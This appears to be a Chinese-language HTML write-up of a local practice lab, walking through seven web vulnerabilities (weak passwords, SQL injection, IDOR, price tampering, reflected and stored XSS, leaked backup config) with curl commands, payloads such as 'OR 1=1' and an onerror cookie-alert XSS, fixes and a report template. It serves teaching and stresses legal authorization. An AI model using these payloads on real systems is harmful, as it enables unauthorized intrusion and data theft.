@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>靶场实操全记录 —— 从侦察到写报告</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#F5F6F4;color:#1F2321;font-family:system-ui,-apple-system,"Segoe UI","Microsoft YaHei",sans-serif;font-size:15px;line-height:1.75}
+.wrap{max-width:900px;margin:0 auto;padding:36px 22px 80px}
+h1{font-size:26px;font-weight:600;margin:0 0 8px;letter-spacing:-.01em}
+.sub{color:#6B716C;font-size:14px;margin:0 0 26px}
+h2{font-size:19px;font-weight:600;margin:44px 0 4px;padding-top:20px;border-top:1px solid #E3E5E0}
+h2 .num{color:#185FA5;font-weight:700;margin-right:8px}
+h3{font-size:16px;font-weight:600;margin:0 0 4px}
+p{color:#5A605C;font-size:14.5px;margin:10px 0}
+code{font-family:ui-monospace,Consolas,"Courier New",monospace;font-size:13px;background:#EFEDE6;padding:2px 6px;border-radius:4px;color:#3B403C}
+pre{background:#1F2321;color:#E6E8E4;border-radius:12px;padding:15px 17px;overflow-x:auto;font-family:ui-monospace,Consolas,monospace;font-size:13px;line-height:1.7;margin:12px 0;position:relative}
+pre .cmt{color:#8A908C}
+pre .req{color:#7CC4F0}
+pre .ok{color:#7ED9A8}
+pre .hit{color:#F5C86A;font-weight:600}
+pre .bad{color:#F09A9A}
+.tag{display:inline-block;font-size:11.5px;padding:2px 9px;border-radius:999px;background:#E9EDF5;color:#185FA5;border:1px solid #C3D8EE;margin-right:6px;vertical-align:2px}
+.tag.red{background:#FCEBEB;color:#8C2C2C;border-color:#F0BEBE}
+.tag.amber{background:#FDF3E0;color:#8A5A12;border-color:#EBD9AE}
+.card{background:#fff;border:1px solid #E3E5E0;border-radius:14px;padding:20px 22px;margin:16px 0}
+.card .head{display:flex;align-items:baseline;gap:10px;flex-wrap:wrap;margin-bottom:2px}
+.card .head .idx{font-family:ui-monospace,monospace;color:#185FA5;font-weight:700;font-size:14px}
+.card .why{background:#F4F7FB;border-left:3px solid #378ADD;border-radius:0 8px 8px 0;padding:10px 14px;margin:12px 0;font-size:13.5px;color:#3F5570}
+.card .fix{background:#F1F8F4;border-left:3px solid #4CA97C;border-radius:0 8px 8px 0;padding:10px 14px;margin:12px 0;font-size:13.5px;color:#2E5C44}
+.card .fix b,.card .why b{color:inherit}
+.caption{font-size:12.5px;color:#8A908C;margin:6px 0 0}
+.badges{display:flex;flex-wrap:wrap;gap:8px;margin:16px 0 8px}
+.badge{font-size:12.5px;padding:5px 12px;border-radius:999px;background:#E1F5EE;color:#085041;border:1px solid #9FE1CB}
+.badge.wait{background:#F1EFE8;color:#888780;border-color:#D3D1C7}
+table{width:100%;border-collapse:collapse;background:#fff;border:1px solid #E3E5E0;border-radius:10px;overflow:hidden;font-size:13.5px;margin:14px 0}
+th{background:#F1EFE8;text-align:left;padding:10px 13px;font-size:13px;font-weight:600}
+td{padding:10px 13px;border-top:1px solid #E3E5E0;color:#5A605C;vertical-align:top}
+td b{color:#1F2321}
+.note{background:#FDF3E0;border:1px solid #EBD9AE;color:#7A5310;border-radius:12px;padding:13px 17px;font-size:13.5px;margin:16px 0}
+.danger{background:#FCEBEB;border:1px solid #F0BEBE;color:#791F1F;border-radius:12px;padding:13px 17px;font-size:13.5px;margin:16px 0}
+.foot{margin-top:52px;padding-top:20px;border-top:1px solid #E3E5E0;color:#8A908C;font-size:12.5px}
+ul{color:#5A605C;font-size:14.5px;padding-left:22px}
+li{margin:5px 0}
+li b{color:#1F2321}
+.kbd{font-family:ui-monospace,monospace;font-size:12.5px;background:#fff;border:1px solid #D2D5CE;border-radius:5px;padding:1px 6px;box-shadow:0 1px 0 #D2D5CE}
+.copy{position:absolute;top:9px;right:10px;font-size:11.5px;padding:3px 9px;border-radius:6px;border:1px solid #4A504B;background:#2C312D;color:#B9BFBA;cursor:pointer}
+.copy:hover{background:#3A403B;color:#fff}
+.arrow{text-align:center;color:#B0B6B1;font-size:18px;line-height:1;margin:2px 0}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<h1>靶场实操全记录</h1>
+<p class="sub">环境：本地靶场 <code>http://localhost:3000</code>（只监听 127.0.0.1）&nbsp;·&nbsp; 7 关全部打通 &nbsp;·&nbsp; 全部请求可在自己机器上复现</p>
+
+<div class="badges">
+  <span class="badge">1 弱口令 ✅</span>
+  <span class="badge">2 SQL 注入 ✅</span>
+  <span class="badge">3 越权 IDOR ✅</span>
+  <span class="badge">4 金额篡改 ✅</span>
+  <span class="badge">5 反射型 XSS ✅</span>
+  <span class="badge">6 存储型 XSS ✅</span>
+  <span class="badge">7 敏感文件泄露 ✅</span>
+</div>
+
+<p>这份记录不是"答案清单"，而是<strong>一次完整测试的过程还原</strong>：每一步我是怎么想的、发了什么请求、服务端回了什么、从哪个细节判断出下一步该试什么。把 7 关串起来看，你会发现它其实是一个标准渗透测试项目的缩影——<strong>先侦察，再逐点测试，最后回到报告</strong>。</p>
+
+<h2><span class="num">阶段一</span>信息收集：先把"地图"画出来</h2>
+
+<p>新手最常犯的错误是一上来就往登录框里输密码。老手先花时间<strong>看</strong>。这一步在整个项目里占的时间最多，收益也最大——本次实操里，第 7 关的答案在这一步就已经暴露了。</p>
+
+<h3>动作 1：把首页暴露的入口全部抓下来</h3>
+<pre><button class="copy">复制</button><span class="cmt"># 只抓"入口：xxx"这一行的路径，不猜，直接提取</span>
+curl -sS --noproxy '*' http://127.0.0.1:3000/ | grep -oE '入口：&lt;code&gt;[^&lt;]*'
+
+<span class="ok">/login
+/user?id=1
+/orders
+/shop
+/search?q=hi
+/guestbook
+/robots.txt</span></pre>
+<p class="caption">7 个入口 = 7 个功能点。每个功能点后面都要问一遍"四个方向"，这就是后面的测试清单。</p>
+
+<h3>动作 2：先看 robots.txt —— 它是"此地无银三百两"</h3>
+<pre><button class="copy">复制</button><span class="req">GET</span> /robots.txt
+
+<span class="ok">User-agent: *
+Disallow: /backup/
+Disallow: /admin/</span></pre>
+<div class="why"><b>为什么先看它：</b>robots.txt 的用途是"告诉搜索引擎别抓这些目录"，但它的内容对所有人公开。它等于站方主动写了一份「这里有些东西我不想让人看见」的清单。<b>Disallow 的路径历来是目录爆破字典里最该优先试的一批。</b></div>
+
+<h3>动作 3：逐路径探测，看状态码</h3>
+<pre><button class="copy">复制</button>for path in /admin/ /backup/ /backup/config.bak /index.php /api/order /debug; do
+  printf "  %-22s HTTP %s\n" "$path" "$(curl -sS --noproxy '*' -o /dev/null -w '%{http_code}' "http://127.0.0.1:3000$path")"
+done
+
+  /admin/                <span class="bad">HTTP 404</span>
+  /backup/               <span class="bad">HTTP 404</span>
+  /backup/config.bak     <span class="hit">HTTP 200</span>   ← 目录本身没开列表，但里面的文件能直接下
+  /index.php             <span class="bad">HTTP 404</span>
+  /api/order             <span class="ok">HTTP 200</span>
+  /debug                 <span class="bad">HTTP 404</span></pre>
+<div class="why"><b>这里有个关键认知：</b><code>/backup/</code> 返回 404 不代表里面没东西，只代表"这个目录不允许列文件"。真正的探测要一路试到具体文件名。真实世界里 <code>.bak .zip .git .svn .env config.php~</code> 都是同一批字典。<br><b>注意：</b>状态码只是提示，不是结论——真正判定要去看返回内容里有没有敏感信息。</div>
+<p>到此为止，一次请求都还没"攻击"过，但已经锁定了一条高价值线索。<strong>先拿这条，后面再回来收。</strong></p>
+
+<h2><span class="num">阶段二</span>逐关测试：每一关都是一次"四个方向"的验证</h2>
+
+<div class="card">
+<div class="head"><span class="idx">01</span><h3>弱口令登录</h3><span class="tag">过度信任？不，是配置失误</span><span class="tag red">成因：人为疏忽</span></div>
+<p>入口 <code>/login</code>。这类点位的思路不是"爆破一万次"，而是<strong>先试少数几个高频组合</strong>：<span class="kbd">admin/123456</span>、<span class="kbd">admin/admin</span>、<span class="kbd">admin/88888888</span>、<span class="kbd">admin/admin123</span>。</p>
+
+<pre><button class="copy">复制</button><span class="cmt"># 第一次：admin / 123456 —— 失败</span>
+curl -sS -i --noproxy '*' -X POST -d "username=admin&amp;password=123456" http://127.0.0.1:3000/login | head -3
+
+<span class="bad">HTTP/1.1 302 Found
+Location: /login?msg=fail</span>       ← 302 跳回带 fail 的地址 = 失败
+
+<span class="cmt"># 第二次：admin / admin123 —— 成功</span>
+curl -sS --noproxy '*' -X POST -d "username=admin&amp;password=admin123" http://127.0.0.1:3000/login | grep -oE "FLAG\{[^}]*\}|登录成功"
+
+<span class="hit">登录成功
+FLAG{n0_m0re_123456}</span></pre>
+
+<div class="why"><b>一个被低估的技巧：</b>不要只看页面文字，要看<b>响应头</b>。这次登录失败返回的是 <code>302 → /login?msg=fail</code>，而成功是 <code>200</code> 直接渲染新页面。<b>状态码和跳转地址本身就是最干净的判断信号</b>，比去页面里找"用户名或密码错误"这行字可靠得多。真实测试里还可以看响应长度差异。</div>
+<div class="fix"><b>修复建议：</b>① 禁止默认口令，首次登录强制改密；② 登录失败做次数限制 + 指数退避，防撞库；③ 管理后台不要暴露在公网，或加 IP 白名单 / VPN；④ 接入多因素认证。</div>
+<p class="caption"><span class="tag amber">合规提醒</span>真实平台基本都禁止对登录接口做批量爆破（会锁账号，也违反测试规则）。弱口令只试少数几个高频组合，试不出来就放弃这个方向。</p>
+</div>
+
+<div class="card">
+<div class="head"><span class="idx">02</span><h3>SQL 注入</h3><span class="tag">改值 / 改类型</span><span class="tag red">成因：把数据当成了代码</span></div>
+<p>入口 <code>/user?id=1</code>。靶场很贴心地把服务端执行的 SQL 打印出来了，但<strong>真实环境中没有这个福利</strong>，所以我们还是按真实流程走一遍：先正常请求 → 加一个单引号探测 → 根据反应判断。</p>
+
+<p><b>第 1 步：先建立一个"正常"的基准。</b></p>
+<pre><button class="copy">复制</button><span class="req">GET</span> /user?id=1
+
+<span class="ok">服务端实际执行的语句：SELECT * FROM users WHERE id = 1
+id | 用户名 | 角色     | 备注
+1  | alice  | 普通用户 | 我的生日是 1998-03-12</span></pre>
+<p>记住这个"正常长什么样"，后面所有异常才有对照物。</p>
+
+<p><b>第 2 步：加一个单引号 —— 这是判断注入存在的经典手法。</b></p>
+<pre><button class="copy">复制</button><span class="req">GET</span> /user?id=1<span class="hit">'</span>
+
+<span class="ok">服务端实际执行的语句：SELECT * FROM users WHERE id = 1&#39;</span>
+<span class="bad">SQL 语法错误：Invalid or unexpected token</span></pre>
+<div class="why"><b>这一步是整个漏洞的"定罪证据"。</b>我只是输入了一个普通字符 <code>'</code>，应用却报了 SQL 语法错误——这说明：<b>这个引号没有被当成"数据"，而是被塞进了数据库语句里，改变了语句的结构。</b>一个字符就能让程序报错，等于应用亲口承认"我把你的输入拼进 SQL 了"。<br><br>真实的报错页面还会泄露更多：数据库类型（MySQL/PostgreSQL）、版本号、表的字段名、甚至服务器物理路径。<b>报错信息本身就是情报</b>，这也是为什么正式环境必须关闭详细报错。</div>
+
+<p><b>第 3 步：既然值我说了算，那就构造一个恒真条件。</b></p>
+<pre><button class="copy">复制</button><span class="req">GET</span> /user?id=1<span class="hit">%20OR%201=1</span>
+
+<span class="ok">服务端实际执行的语句：SELECT * FROM users WHERE id = 1 OR 1=1</span>
+
+查询结果：
+<span class="hit">1  | alice  | 普通用户 | 我的生日是 1998-03-12
+2  | admin  | 管理员   | FLAG{sql1_str1ng_c0nc4t_w1ns}
+3  | bob    | 普通用户 | 我的手机是 138****1234</span></pre>
+<div class="why"><b>原理：</b>原本的语句是"取 id = 1 的那一行"。我加上 <code>OR 1=1</code> 之后，条件变成"id = 1 <b>或者</b> 恒真"——恒真意味着<b>没有任何一行能被排除</b>，于是整张表被吐了出来。<br><br>看清楚了：<b>我没有猜密码，也没有破解任何加密，我只是把一个"条件"改成了它永远成立。</b>这就是注入类漏洞的共同本质——控制查询逻辑，而不是破解凭据。</div>
+<div class="fix"><b>修复建议：</b>① <b>用参数化查询（预编译语句）</b>——这是唯一彻底的方案，让 SQL 结构在拼接前就固定下来，用户输入只能当值；② 对 id 这类参数做类型强校验（必须是整数）；③ 数据库账号最小权限，去掉不必要的读表权限；④ 生产环境关闭详细报错，统一返回泛化错误页。</div>
+<p class="caption"><span class="tag amber">合规底线</span>真实测试中，SQL 注入<b>只能取到证明漏洞存在所需的最小信息</b>（库名、表名、字段名即可）。严禁 dump 用户数据、严禁改删数据。这是资质会被吊销、甚至要负刑责的红线。</p>
+</div>
+
+<div class="card">
+<div class="head"><span class="idx">03</span><h3>越权访问（IDOR）</h3><span class="tag">改身份 ← 新手最容易出成果</span><span class="tag red">成因：只认参数，不认人</span></div>
+<p>入口 <code>/api/order?id=1001</code>。先看自己的订单建立基准：</p>
+<pre><button class="copy">复制</button><span class="req">GET</span> /api/order?id=1001
+
+<span class="ok">商品：机械键盘  金额：¥399  说明：这是你自己的订单</span></pre>
+
+<p>确认了 URL 里的 <code>id</code> 就是订单编号之后，问自己那句核心的话：<strong>"这个 id 我说了算吗？换成别人的会怎样？"</strong></p>
+<pre><button class="copy">复制</button><span class="req">GET</span> /api/order?id=<span class="hit">1002</span>
+
+<span class="ok">商品：显示器  金额：¥1899  说明：这是别人的订单</span>
+<span class="hit">FLAG{1d0r_ch4nge_the_1d}</span></pre>
+<div class="why"><b>这类漏洞为什么值得你优先找：</b>它几乎不需要任何"技术技巧"——不改包、不注入、不绕过滤器，只把数字改了一个。但它造成的后果可能是"任意用户可查看他人订单/资料/身份证照片"。<br><br>它之所以普遍，是因为开发时常常只写了"根据 id 查数据"，而忘了补一句<b>"这个 id 属不属于当前登录的人"</b>。功能测试时用管理员账号走一遍全都正常，所以最容易漏。<br><br><b>要试的参数名远不止 id：</b>uid、userId、orderId、accountId、fileId、docId、tenantId、role……</div>
+<div class="fix"><b>修复建议：</b>① 服务端从会话（Token/Session）里取当前用户身份，<b>而不是从请求参数里取</b>；② 每次访问对象前做归属校验（<code>WHERE id = ? AND owner_id = 当前用户</code>）；③ 用不可枚举的随机标识（UUID）替代自增 ID，提高遍历成本（<b>这只是缓解，不能替代授权校验</b>）。</div>
+</div>
+
+<div class="card">
+<div class="head"><span class="idx">04</span><h3>金额篡改（业务逻辑漏洞）</h3><span class="tag">改顺序 / 改值</span><span class="tag red">成因：过度信任客户端</span></div>
+<p>入口 <code>/shop</code>。商品标价 ¥399。观察下单表单：<b>金额是浏览器提交上来的一个字段</b>——这就是破绽。</p>
+
+<pre><button class="copy">复制</button><span class="cmt"># 先用原价走一遍，确认流程正常</span>
+curl -sS --noproxy '*' -X POST -d "item=机械键盘&amp;amount=399" http://127.0.0.1:3000/api/pay | grep -oE "下单成功[^&lt;]*"
+
+<span class="ok">下单成功：机械键盘，实付 ¥399</span>
+
+<span class="cmt"># 再只改一个字段的值（商品不动）</span>
+curl -sS --noproxy '*' -X POST -d "item=机械键盘&amp;amount=0.01" http://127.0.0.1:3000/api/pay | grep -oE "下单成功[^&lt;]*|FLAG\{[^}]*\}"
+
+<span class="ok">下单成功：机械键盘，实付 ¥0.01</span>
+<span class="hit">FLAG{trust_n0_client_4mount}</span></pre>
+<div class="why"><b>关键点：改的是"服务端本不该听的那个字段"。</b>商品是真货、页面没改过、请求也没伪造——我只是如实告诉服务端"你收 0.01 就行"，而它信了。<br><br>真实世界里这个字段可能叫 <code>amount</code>、<code>price</code>、<code>total</code>、<code>discount</code>、<code>quantity</code>、<code>couponId</code>。<b>判断标准只有一句话：这个值如果被客户端随意指定，会不会造成资金损失？</b><br><br>同类的还有：把数量改成 -1（退款叠加）、重复使用同一张优惠券、跳过支付直接访问"支付成功"回调、把订单状态直接改成"已发货"。这类洞<b>不需要技术，需要的是商业理解</b>。</div>
+<div class="fix"><b>修复建议：</b>① 价格、折扣、总金额<b>全部由服务端根据商品 ID 自己计算</b>，客户端只传"买了什么、买几个"；② 对金额做区间与一致性校验；③ 支付回调必须验签，且幂等；④ 关键业务操作（下单、退款、提现）必须做服务端状态机校验，不允许跨状态跳转。</div>
+</div>
+
+<div class="card">
+<div class="head"><span class="idx">05</span><h3>反射型 XSS</h3><span class="tag">改值 / 改类型</span><span class="tag amber">成因：输出未编码</span></div>
+<p>入口 <code>/search?q=hello</code>。第一步永远是：<strong>先确认输入会不会被原样显示在页面上。</strong></p>
+
+<pre><button class="copy">复制</button><span class="req">GET</span> /search?q=hello
+<span class="ok">关键词：&lt;b&gt;hello&lt;/b&gt;</span>
+
+<span class="cmt"># 换成一段带标签的内容，看它被"当文字"还是"当代码"</span>
+<span class="req">GET</span> /search?q=%3Cb%3Etest%3C%2Fb%3E
+<span class="bad">关键词：&lt;b&gt;&lt;b&gt;test&lt;/b&gt;&lt;/b&gt;</span>       ← 我输入的 &lt;b&gt; 没被转义，直接变成了加粗标签
+
+<span class="cmt"># 既然标签能生效，换成 script 试试</span>
+<span class="req">GET</span> /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+<span class="hit">FLAG{reflected_xss_1s_y0urs}</span></pre>
+
+<div class="why"><b>推理链条是这样的：</b><br>
+① 我输入 <code>&lt;b&gt;test&lt;/b&gt;</code>，页面返回的 HTML 里<b>原样</b>是我的 <code>&lt;b&gt;</code>，而不是 <code>&amp;lt;b&amp;gt;</code>；<br>
+② 说明服务端<b>没有对输出做 HTML 编码</b>；<br>
+③ 那么浏览器在渲染这段 HTML 时，会把我写的东西<b>当成页面结构的一部分</b>而不是文字；<br>
+④ 于是把 <code>&lt;b&gt;</code> 换成 <code>&lt;script&gt;</code>，浏览器就会执行它。<br><br>
+<b>这一步是一次"等价替换"，不是撞运气。</b>真正的危害不在 <code>alert(1)</code>，而在于攻击者可以构造一个链接，让受害者点开后在其浏览器里以受害者的身份执行任意操作——这就是"窃取登录态（Cookie）"的经典路径。</div>
+
+<div class="note"><b>一个必须讲清楚的技术细节：</b>我用 curl 只能证明"服务端把 &lt;script&gt; 原样吐回来了"，但 <b>curl 不会执行 JavaScript</b>。<br>要证明"真的弹窗了"，必须用浏览器打开这个链接亲眼看。这就是为什么 XSS 类漏洞的报告里<b>必须有一张浏览器截图</b>——光有 HTTP 响应，审核人员会怀疑你是不是把"回显"当成了"执行"。</div>
+
+<div class="fix"><b>修复建议：</b>① 输出的时候按上下文转义（HTML 正文转义 <code>&amp; &lt; &gt; " '</code>）；② 优先用框架自带的安全输出（Vue/React 默认转义，别随便用 <code>v-html</code> / <code>dangerouslySetInnerHTML</code>）；③ 配合 CSP（内容安全策略）作为纵深防御；④ Cookie 加 <code>HttpOnly</code>，即使被 XSS 也偷不到会话。</div>
+</div>
+
+<div class="card">
+<div class="head"><span class="idx">06</span><h3>存储型 XSS</h3><span class="tag">改值</span><span class="tag red">成因：输入未过滤 + 输出未编码</span></div>
+<p>入口 <code>/guestbook</code>。反射型是"谁点链接谁中招"，存储型是<strong>"所有访问者都中招"</strong>——区别就在于内容是<b>永久存在服务端</b>的。</p>
+
+<pre><button class="copy">复制</button><span class="cmt"># 提交一条带事件的留言</span>
+curl -sS -X POST --noproxy '*' \
+  --data-urlencode "user=attacker" \
+  --data-urlencode "text=&lt;img src=x onerror=alert(document.cookie)&gt;" \
+  http://127.0.0.1:3000/guestbook -o /dev/null -w "提交 HTTP %{http_code}\n"
+
+<span class="ok">提交 HTTP 302</span>   ← 302 = 保存成功并跳回列表
+
+<span class="cmt"># 关键：以"另一个访客"的身份重新打开留言板（不带你刚才的输入）</span>
+curl -sS --noproxy '*' http://127.0.0.1:3000/guestbook | grep -oE "onerror=alert[^&gt;]*"
+
+<span class="bad">onerror=alert(document.cookie)</span>
+<span class="hit">FLAG{stored_xss_h1ts_everyone}</span></pre>
+
+<div class="why"><b>注意我刻意用了 <code>&lt;img onerror=&gt;</code> 而不是 <code>&lt;script&gt;</code>。</b>这来自一个真实世界的重要经验：现代浏览器在插入 innerHTML 时<b>默认不执行 <code>&lt;script&gt;</code></b>，但会执行 <code>onerror</code>、<code>onload</code> 这类事件属性。<b>换一种"等价但更可能生效"的写法</b>，是测试中非常常见的思路——同一个目标，多试几种载体。<br><br>另外注意：我是用<b>第二次请求</b>去读留言板的。第一次是"写入"，第二次是"读取"。<b>这个"写入 → 换个身份重新读取"的动作，就是验证存储型 XSS 的标准姿势</b>——它证明了恶意内容已经进入了服务端、并对所有人可见。</div>
+<div class="fix"><b>修复建议：</b>① 存储前做白名单过滤，输出时按上下文编码（<b>两者都要，不能只做一半</b>）；② 富文本场景用专业库（DOMPurify）做净化，而不是自己写正则；③ 全站开启 CSP，限制内联脚本与外部域加载。</div>
+</div>
+
+<div class="card">
+<div class="head"><span class="idx">07</span><h3>敏感文件泄露</h3><span class="tag">改值（路径）</span><span class="tag amber">成因：部署疏忽</span></div>
+<p>这一关的答案<strong>在阶段一就已经拿到了</strong>。当时侦察发现 <code>/backup/config.bak</code> 返回 200，现在回来收它：</p>
+
+<pre><button class="copy">复制</button><span class="req">GET</span> /backup/config.bak
+
+<span class="ok"># 站点备份配置 —— 本该永远不放在公网
+DB_HOST=127.0.0.1
+DB_USER=root
+DB_PASS=<span class="hit">FLAG{b4ckup_f1les_4re_g0ld}</span>
+SECRET_KEY=9f3a2b7c1e8d</span></pre>
+
+<div class="why"><b>为什么这个洞比看起来严重得多：</b>拿到这里的数据库账号密码之后，攻击者往往<b>不需要再挖任何 Web 漏洞</b>——直接连数据库就行了。同理还有 <code>.git/config</code>（能还原整站源码）、<code>.env</code>（各种密钥）、<code>web.config.bak</code>、备份的 SQL 文件。<br><br><b>习惯养成：</b>看到 robots.txt 里的 Disallow 路径，先按目录探，再按"常见备份文件名"探——<code>index.php.bak</code>、<code>www.zip</code>、<code>backup.tar.gz</code>、<code>.DS_Store</code>。这一步在真实项目里产出率很高，而且技术门槛低。</div>
+<div class="fix"><b>修复建议：</b>① 备份文件、源码包、配置文件一律放在 Web 根目录之外，或改用对象存储 + 鉴权下载；② Nginx/Apache 显式拒绝对 <code>.bak .zip .sql .git .env</code> 等后缀的访问；③ 立刻轮换已泄露的密钥与数据库口令（<b>已泄露的凭据不能只删文件就算修好</b>）；④ 上线前用"发布检查清单"扫一遍根目录。</div>
+</div>
+
+<h2><span class="num">阶段三</span>收尾：把测试过程变成一份能提交的报告</h2>
+
+<p>挖到漏洞只完成了工作的一半。<strong>在 SRC/众测平台上，"漏洞能不能过审、能定几级"，很大程度取决于报告写得怎么样。</strong>下面是第 2 关 SQL 注入的标准报告形态，可以直接当模板用。</p>
+
+<table>
+<tr><th style="width:110px">字段</th><th>内容</th></tr>
+<tr><td><b>漏洞名称</b></td><td>用户查询接口存在 SQL 注入</td></tr>
+<tr><td><b>漏洞类型</b></td><td>SQL 注入（OWASP A03:2021 注入类）</td></tr>
+<tr><td><b>危害等级</b></td><td>高危</td></tr>
+<tr><td><b>漏洞 URL</b></td><td><code>http://host/user?id=1</code> ← <b>必须给完整 URL，含参数</b></td></tr>
+<tr><td><b>漏洞参数</b></td><td><code>id</code>（GET）</td></tr>
+<tr><td><b>复现步骤</b></td><td>1. 访问 <code>/user?id=1</code>，正常返回用户 alice 的信息<br>2. 在 id 后加入单引号 <code>/user?id=1'</code>，页面返回 SQL 语法错误<br>3. 构造 <code>/user?id=1 OR 1=1</code>，返回全部 3 条用户记录<br>4. 证明 payload 改变了查询条件结构，属注入</td></tr>
+<tr><td><b>危害说明</b></td><td>攻击者可绕过查询条件读取数据库中任意数据；若数据库账号权限过高，进一步可能读取服务器文件、写入文件获取服务器权限。<b>当前实际影响：</b>可越权读取全部用户记录。</td></tr>
+<tr><td><b>修复建议</b></td><td>使用参数化查询（预编译）；对 id 做强类型校验；生产环境关闭详细报错；数据库账号最小权限。</td></tr>
+<tr><td><b>附件</b></td><td>① 正常返回截图 ② 单引号报错截图 ③ <code>OR 1=1</code> 返回全量数据截图 ④ 原始请求包</td></tr>
+</table>
+
+<div class="note"><b>四个最常见的驳回原因，直接决定你能不能拿到钱：</b><br>
+1. <b>截图不清晰</b>，或截图里看不到完整 URL —— 审核员无法确认你打的是哪个资产；<br>
+2. <b>没有给完整 URL / 参数</b>，只说"用户查询页面有注入"；<br>
+3. <b>危害等级定错</b>（把信息泄露报成高危，或者把 SQL 注入报成低危）；<br>
+4. <b>修复建议空泛</b>，只写"建议加强安全防护"。<br><br>
+报告里每一条都要能被别人<b>照着复现一遍</b>——这是唯一的验收标准。</div>
+
+<h2>复盘：这 7 关真正教你的是什么</h2>
+
+<p>把 7 关按"四个方向"重新排一遍，你会发现它们不是 7 个孤立的知识点，而是<b>同一个提问框架的 7 次应用</b>：</p>
+
+<table>
+<tr><th style="width:88px">方向</th><th>要问自己的那句话</th><th>本次命中</th></tr>
+<tr><td><b>改值</b></td><td>这个参数我说了算吗？改成 0 / -1 / 超大数 / 特殊字符 / 超长串会怎样？</td><td>SQL 注入（加 <code>OR 1=1</code>）、金额篡改（399 → 0.01）、XSS（塞标签）、文件泄露（换路径）</td></tr>
+<tr><td><b>改身份</b></td><td>把 id / uid / orderId / role 换成别人的或管理员的，还能访问吗？</td><td>越权 IDOR（1001 → 1002）</td></tr>
+<tr><td><b>改顺序</b></td><td>该三步走的流程能不能跳到第三步？重复提交、并发提交会怎样？</td><td>金额篡改里"价格本该服务端定"就是同一类问题</td></tr>
+<tr><td><b>改类型</b></td><td>数字换字符串、<code>false</code> 改 <code>true</code>、删字段、多传字段？</td><td>SQL 注入（引号改变类型）、XSS（文字 → 代码）</td></tr>
+</table>
+
+<p>还有三条比技术更重要的东西，值得写下来：</p>
+<ul>
+<li><b>先看，再打。</b>本次第 7 关在侦察阶段就解决了；真实的项目里，信息收集通常占掉七成时间。急着输密码、急着丢扫描器，是最典型的低效。</li>
+<li><b>报错和状态码是免费情报。</b>一个引号换来一句 SQL 报错、一次 302 跳转暴露登录成败、一个 200 暴露备份文件——这些都是"应用自己说漏嘴"，比你去猜可靠得多。</li>
+<li><b>同一个目标多试几种载体。</b>XSS 里 <code>&lt;script&gt;</code> 不行就换 <code>&lt;img onerror&gt;</code>，真实环境里浏览器和 WAF 的拦截规则各不相同，会变通的人才挖得到洞。</li>
+</ul>
+
+<div class="danger"><b>最后，那条唯一不能越过的线：</b><br>
+本次实操里所有的"攻击"动作，之所以随便发都合法，只因为<b>这个靶场是你自己的</b>。<br>
+真实系统上，<b>没有明确授权，发出去的第一个包就是违法行为</b>（非法侵入计算机信息系统）；拿漏洞向企业索要钱财，属于<b>敲诈勒索</b>，不是漏洞赏金。<br>
+合法的真实战场只有一条入口：<b>平台明确列出的授权范围（scope）内</b>。靶场里你怎么打都行，出了靶场，先看授权。</div>
+
+<h2>接下来做什么</h2>
+<ul>
+<li><b>自己重打一遍。</b>本次实操的 7 个 flag 已经全部记录在案，<b>靶场进度已重置为 0/7</b>，你可以完全按照上面的思路自己走一遍——亲手做过一遍，和看懂一遍，是两件事。</li>
+<li><b>换环境继续。</b>本地靶场只是热身。下一步建议去 <b>PortSwigger Web Security Academy</b>（<code>portswigger.net/web-security</code>），它把每个漏洞类型做成了分难度关卡，官方免费，讲解与实验设计是业界最好的。详细清单见工作区里的《靶场清单与使用方法》。</li>
+<li><b>练"写报告"。</b>每打完一关，就按上面的模板写一份报告出来。这项能力在真实平台上直接决定你的收入。</li>
+</ul>
+
+<div class="foot">
+本地靶场实操全记录 &nbsp;·&nbsp; 环境：<code>http://localhost:3000</code>（仅 127.0.0.1）<br>
+重新启动靶场：双击 <code>vulnlab/启动靶场.bat</code> &nbsp;·&nbsp; 重置进度：访问 <code>/reset</code>
+</div>
+
+</div>
+
+<script>
+document.querySelectorAll('.copy').forEach(function (btn) {
+  btn.addEventListener('click', function () {
+    var pre = btn.parentElement.cloneNode(true);
+    var b = pre.querySelector('.copy');
+    if (b) b.remove();
+    var text = pre.innerText;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.textContent = '已复制';
+      setTimeout(function () { btn.textContent = '复制'; }, 1400);
+    });
+  });
+});
+</script>
+</body>
+</html>
